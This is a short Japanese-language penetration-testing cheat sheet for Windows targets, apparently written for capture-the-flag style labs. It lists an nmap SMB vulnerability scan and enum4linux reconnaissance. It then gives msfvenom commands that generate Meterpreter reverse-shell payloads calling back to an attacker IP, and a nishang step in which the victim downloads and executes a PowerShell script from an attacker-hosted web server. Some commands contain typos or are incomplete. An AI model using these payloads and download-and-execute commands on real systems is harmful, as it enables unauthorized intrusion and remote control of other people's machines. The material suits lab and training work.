---
{"dg-publish":true,"permalink":"/pentest-technique/windows/"}
---




---

# 脆弱性スキャン

### TCPポート 445・TCP/UDPポート 139が空いている場合

- **NmapでSMBの脆弱性をスキャン**

```bash
nmap --script=smb-vuln* <IP>
```


---
## 情報収集
### Sambaを介して共有情報を取得

- **enum4linux
    Sambaを介して情報を抽出できるツール。
- 取得できる情報:
    - グループメンバーシップ情報
    - 共有情報
    - ワークグループまたはドメインメンバーシップ
    - リモートオペレーティングシステムの識別
    - パスワードポリシーの取得

---


---

### **Msfvenomでのリバースシェル作成**

#### **32ビット用

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.34 LPORT=8888 -f aspx > shell2.aspx
```

#### **64ビット用

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.34 LPORT=1234 -f exe > stageless_payload_x64.exe
```

---

## 権限昇格
### nishang
  https://github.com/samratashok/nishang
 - 流れ
```bash
sudo apt install nishang
sudo updatedb && locate nishang
Invoke-Powershell-UdpOneLine.ps1
sudo cp Invoke-Powershell-UdpOneLine.ps1
- 攻撃者側にwebサーバーを立てる
- やられ側のwindowsでダウンロードする
powershell.exe /c Invoke-Expression(New-Object Net.WebClient).DownladString(http://攻撃者側IP/Update.ps1)
```

### フラグ検索
- Cディレクトリを再帰的に検索
- 大文字も小文字も関係なく検索

```bash
dir /s /b C:\user.txt
```


```bash
dir /s /b C:\root.txt
```

